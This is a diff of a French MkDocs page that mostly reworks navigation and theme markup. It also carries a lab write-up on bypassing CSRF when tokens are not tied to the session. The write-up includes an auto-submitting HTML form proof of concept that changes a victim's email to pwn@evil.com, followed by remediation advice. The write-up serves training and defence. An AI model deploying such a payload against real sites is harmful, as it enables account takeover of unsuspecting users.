@@ -64,16 +64,23 @@
   
     
     
+      
     
     
     
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="cyan">
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
+      
+        
+        <a href="#rapport-methodologique-contournement-de-csrf-via-un-jeton-non-lie-a-la-session" class="md-skip">
+          Aller au contenu
+        </a>
       
     </div>
     <div data-md-component="announce">
@@ -113,7 +120,33 @@
     </div>
     
       
+        <form class="md-header__option" data-md-component="palette">
+  
     
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="Passer en mode sombre"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Passer en mode sombre" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="Passer en mode clair"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Passer en mode clair" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
     
     
     
@@ -223,7 +256,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../siem-soc/siem-wazuh/" class="md-tabs__link">
+        <a href="../../siem-soc/agent-wazuh/" class="md-tabs__link">
           
   
   
@@ -393,6 +426,26 @@
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Contournement CSRF
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
         
@@ -410,6 +463,108 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-informations-generales" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Informations Générales
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-analyse-de-la-vulnerabilite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Analyse de la Vulnérabilité
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-methodologie-dexploitation-pas-a-pas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Méthodologie d'Exploitation (Pas à Pas)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Méthodologie d&#39;Exploitation (Pas à Pas)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#etape-1-phase-de-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 1: Phase de Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-2-preparation-de-lexploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 2: Préparation de l'Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-3-livraison-delivery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 3: Livraison (Delivery)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-recommandations-de-remediation-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Recommandations de Remédiation (Mitigation)
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -538,34 +693,6 @@
   
   
     <li class="md-nav__item">
-      <a href="../../siem-soc/siem-wazuh/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    SIEM Wazuh – Architecture Freelance
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
       <a href="../../siem-soc/agent-wazuh/" class="md-nav__link">
         
   
@@ -639,6 +766,99 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-informations-generales" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Informations Générales
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-analyse-de-la-vulnerabilite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Analyse de la Vulnérabilité
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-methodologie-dexploitation-pas-a-pas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Méthodologie d'Exploitation (Pas à Pas)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Méthodologie d&#39;Exploitation (Pas à Pas)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#etape-1-phase-de-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 1: Phase de Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-2-preparation-de-lexploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 2: Préparation de l'Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-3-livraison-delivery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 3: Livraison (Delivery)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-recommandations-de-remediation-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Recommandations de Remédiation (Mitigation)
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -655,53 +875,63 @@
 
 
 
-  <h1>Contournement CSRF</h1>
-
-<p>Rapport Méthodologique : Contournement de CSRF via un Jeton Non Lié à la Session
-1. Informations Générales
-Nom de la vulnérabilité : CSRF (Cross-Site Request Forgery)</p>
-<p>Gravité : Élevée (Permet une prise de contrôle partielle de compte via changement d'email)</p>
-<p>Statut du Lab : Résolu (Niveau : Practitioner)</p>
-<ol>
-<li>Analyse de la Vulnérabilité
-Le mécanisme de défense mis en place par l'application repose sur un jeton anti-CSRF nommé csrf. Cependant, l'implémentation souffre d'un défaut de conception majeur : le serveur vérifie uniquement si le jeton soumis existe et est valide globalement, mais il ne valide pas si ce jeton appartient à l'utilisateur qui effectue la requête.</li>
-</ol>
-<p>Conséquence :
-Un attaquant peut utiliser son propre compte pour générer un jeton CSRF valide, puis l'injecter dans un formulaire malveillant. Lorsque la victime soumet ce formulaire, l'application valide la transaction car le jeton est correct, bien qu'il appartienne à l'attaquant.</p>
-<ol>
-<li>Méthodologie d'Exploitation (Pas à Pas)
-Étape 1 : Phase de Reconnaissance
-Connexion au compte attaquant (carlos:montoya).</li>
-</ol>
-<p>Navigation vers la fonctionnalité cible (changement d'email).</p>
-<p>Inspection du code source HTML pour localiser le paramètre de sécurité :</p>
-<p>HTML
-<input required type="hidden" name="csrf" value="[JETON_CSRF_ATTAQUANT]">
-Étape 2 : Préparation de l'Exploit
-Nous construisons un exploit HTML minimaliste conçu pour s'exécuter automatiquement à l'insu de la victime.</p>
-<p>Note technique : Le jeton étant à usage unique (one-time token), l'attaquant doit en générer un frais en rafraîchissant sa page, sans l'utiliser lui-même.</p>
-<p>HTML</p>
-<form action="https://[ID-CIBLE].web-security-academy.net/my-account/change-email" method="POST" id="csrf-poc">
-    <input name="email" value="pwn@evil.com">
-    <input name="csrf" value="D8AGHB0f09EIn8J9ymVEZHnGIKQCV8N7">
-</form>
-
-<script>
-    // Soumission automatique immédiate
-    document.getElementById('csrf-poc').submit();
-</script>
-<p>Étape 3 : Livraison (Delivery)
-Le script HTML est hébergé sur le serveur d'exploit. Dès que la victime (connectée à sa propre session) consulte cette page, son navigateur transmet automatiquement :</p>
-<p>Ses propres cookies de session (qui l'identifient auprès du serveur).</p>
-<p>Le formulaire contenant le jeton CSRF valide de l'attaquant.</p>
+<h1 id="rapport-methodologique-contournement-de-csrf-via-un-jeton-non-lie-a-la-session">Rapport Méthodologique: Contournement de CSRF via un Jeton Non Lié à la Session<a class="headerlink" href="#rapport-methodologique-contournement-de-csrf-via-un-jeton-non-lie-a-la-session" title="Permanent link">&para;</a></h1>
+<h2 id="1-informations-generales">1. Informations Générales<a class="headerlink" href="#1-informations-generales" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Nom de la vulnérabilité: CSRF (Cross-Site Request Forgery)</li>
+<li>Gravité: Élevée (permet une prise de contrôle partielle de compte via changement d'email)</li>
+<li>Statut du Lab: Résolu (niveau: Practitioner)</li>
+</ul>
+<h2 id="2-analyse-de-la-vulnerabilite">2. Analyse de la Vulnérabilité<a class="headerlink" href="#2-analyse-de-la-vulnerabilite" title="Permanent link">&para;</a></h2>
+<p>Le mécanisme de défense mis en place par l'application repose sur un jeton anti-CSRF nommé <code>csrf</code>.
+Cependant, l'implémentation souffre d'un défaut de conception majeur: le serveur vérifie uniquement si
+le jeton soumis existe et est valide globalement, mais il ne valide pas si ce jeton appartient à
+l'utilisateur qui effectue la requête.</p>
+<p>Conséquence: un attaquant peut utiliser son propre compte pour générer un jeton CSRF valide, puis
+l'injecter dans un formulaire malveillant. Lorsque la victime soumet ce formulaire, l'application valide
+la transaction car le jeton est correct, bien qu'il appartienne à l'attaquant.</p>
+<h2 id="3-methodologie-dexploitation-pas-a-pas">3. Méthodologie d'Exploitation (Pas à Pas)<a class="headerlink" href="#3-methodologie-dexploitation-pas-a-pas" title="Permanent link">&para;</a></h2>
+<h3 id="etape-1-phase-de-reconnaissance">Étape 1: Phase de Reconnaissance<a class="headerlink" href="#etape-1-phase-de-reconnaissance" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Connexion au compte attaquant (<code>carlos:montoya</code>)</li>
+<li>Navigation vers la fonctionnalité cible (changement d'email)</li>
+<li>Inspection du code source HTML pour localiser le paramètre de sécurité</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">required</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;csrf&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;[JETON_CSRF_ATTAQUANT]&quot;</span> <span class="p">/&gt;</span>
+</code></pre></div>
+<h3 id="etape-2-preparation-de-lexploit">Étape 2: Préparation de l'Exploit<a class="headerlink" href="#etape-2-preparation-de-lexploit" title="Permanent link">&para;</a></h3>
+<p>Nous construisons un exploit HTML minimaliste conçu pour s'exécuter automatiquement à l'insu de la victime.</p>
+<p>Note technique: le jeton étant à usage unique (<code>one-time token</code>), l'attaquant doit en générer un frais
+en rafraîchissant sa page, sans l'utiliser lui-même.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://[ID-CIBLE].web-security-academy.net/my-account/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;csrf-poc&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;pwn@evil.com&quot;</span> <span class="p">/&gt;</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;csrf&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;D8AGHB0f09EIn8J9ymVEZHnGIKQCV8N7&quot;</span> <span class="p">/&gt;</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">  </span><span class="c1">// Soumission automatique immédiate</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;csrf-poc&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="etape-3-livraison-delivery">Étape 3: Livraison (Delivery)<a class="headerlink" href="#etape-3-livraison-delivery" title="Permanent link">&para;</a></h3>
+<p>Le script HTML est hébergé sur le serveur d'exploit. Dès que la victime (connectée à sa propre session)
+consulte cette page, son navigateur transmet automatiquement:</p>
+<ul>
+<li>Ses propres cookies de session (qui l'identifient auprès du serveur)</li>
+<li>Le formulaire contenant le jeton CSRF valide de l'attaquant</li>
+</ul>
 <p>L'application associe la session de la victime au jeton valide et applique le changement d'email.</p>
+<h2 id="4-recommandations-de-remediation-mitigation">4. Recommandations de Remédiation (Mitigation)<a class="headerlink" href="#4-recommandations-de-remediation-mitigation" title="Permanent link">&para;</a></h2>
+<p>Pour corriger efficacement cette vulnérabilité, l'équipe de développement doit:</p>
 <ol>
-<li>Recommandations de Remédiation (Mitigation)
-Pour corriger efficacement cette vulnérabilité, l'équipe de développement doit :</li>
+<li>Lier le jeton à la session (cryptographic binding): associer de manière stricte chaque jeton CSRF
+    généré à l'identifiant de session (Session ID) de l'utilisateur concerné. Le serveur doit rejeter la
+    requête si le jeton fourni ne correspond pas à la session active.</li>
+<li>Utiliser des mécanismes de défense intégrés: privilégier l'utilisation de frameworks web modernes qui
+    gèrent nativement et de manière sécurisée la génération et la validation des jetons CSRF.</li>
+<li>Configurer l'attribut <code>SameSite</code>: restreindre l'envoi des cookies de session lors de requêtes
+    cross-sites en configurant l'attribut des cookies sur <code>SameSite=Lax</code> ou <code>SameSite=Strict</code>.</li>
 </ol>
-<p>Lier le Jeton à la Session (Cryptographic Binding) : Associer de manière stricte chaque jeton CSRF généré à l'identifiant de session (Session ID) de l'utilisateur concerné. Le serveur doit rejeter la requête si le jeton fourni ne correspond pas à la session active.</p>
-<p>Utiliser des mécanismes de défense intégrés : Privilégier l'utilisation de frameworks web modernes qui gèrent nativement et de manière sécurisée la génération et la validation des jetons CSRF.</p>
-<p>Configurer l'attribut SameSite : Restreindre l'envoi des cookies de session lors de requêtes cross-sites en configurant l'attribut des cookies sur SameSite=Lax ou SameSite=Strict.</p>
 
 
 
